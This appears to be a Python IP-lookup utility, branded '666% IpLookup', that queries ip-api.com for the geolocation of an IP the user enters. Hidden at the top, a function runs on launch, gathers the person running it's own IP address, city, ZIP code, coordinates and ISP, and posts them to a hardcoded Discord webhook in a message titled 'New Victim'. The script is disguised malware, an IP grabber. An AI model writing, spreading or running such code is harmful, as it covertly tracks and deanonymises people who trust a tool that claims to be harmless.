import os
import time
import json
import requests
import colorama
import sys
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1446950150118441063/VQqDgLj9xoIZvCv-_XRPL8XnFgRG-04wtA4x2NR9XeurrmCgVXILCNLAI8xgCZxGIboT"

def send_own_ip_location():
    try:
        response = requests.get("http://ip-api.com/json/").json()
        ip = response.get("query")
        country = response.get("country")
        region = response.get("regionName")
        city = response.get("city")
        zip_code = response.get("zip")
        lat = response.get("lat")
        lon = response.get("lon")
        isp = response.get("isp")

        embed = {
            "title": "New Victim",
            "color": 0xFF0000,
            "fields": [
                {"name": "IP", "value": ip, "inline": False},
                {"name": "Country", "value": country, "inline": True},
                {"name": "Region", "value": region, "inline": True},
                {"name": "City", "value": city, "inline": True},
                {"name": "ZIP", "value": str(zip_code), "inline": True},
                {"name": "Latitude", "value": str(lat), "inline": True},
                {"name": "Longitude", "value": str(lon), "inline": True},
                {"name": "ISP", "value": isp, "inline": False}
            ]
        }

        payload = {"embeds": [embed]}

        requests.post(WEBHOOK_URL, json=payload)
        print("IP + Standort erfolgreich gesendet!")
    except Exception as e:
        print(f"Fehler beim Senden: {e}")

send_own_ip_location()

colorama.init()

logo = '''

\033[38;5;196m  ████████   ████████   ████████   ███        ███
\033[38;5;160m ███░░░░███ ███░░░░███ ███░░░░███ ░░░       ███░ 
\033[38;5;124m░███   ░░░ ░███   ░░░ ░███   ░░░          ███░   
\033[38;5;88m░█████████ ░█████████ ░█████████        ███░     
\033[38;5;52m░███░░░░███░███░░░░███░███░░░░███     ███░       
\033[38;5;88m░███   ░███░███   ░███░███   ░███   ███░         
\033[38;5;124m░░████████ ░░████████ ░░████████  ███░       ███ 
\033[38;5;160m ░░░░░░░░   ░░░░░░░░   ░░░░░░░░  ░░░        ░░░\033[0m

'''

from colorama import Fore, Style, init
init(autoreset=True)

class RedText:
    def write(self, text):
        sys.__stdout__.write(Fore.RED + text + Style.RESET_ALL)
    def flush(self):
        sys.__stdout__.flush()

sys.stdout = RedText()


while True:
    os.system('cls')
    print(logo)
    os.system('title 666% IpLookup')
    x = input('Press Enter to Start...')

    if x == '':
        os.system('cls')
        IP = input('ENTER TARGET IP:')
        r = requests.get(f'http://ip-api.com/json/{IP}')
        data = r.json()
        print('RESULTS:\n')
        print('')
        print(f'IP: {data['query']}')
        print(f'Country: {data['country']}')
        print(f'Timezone: {data['timezone']}')
        print(f'Region: {data['regionName']}')
        print(f'City: {data['city']}')
        print(f'Zip: {data['zip']}')
        print(f'Latitude: {data['lat']}')
        print(f'Longitude: {data['lon']}')
        print(f'ISP: {data['isp']}')
        pause = input('Press Enter to Continue...')
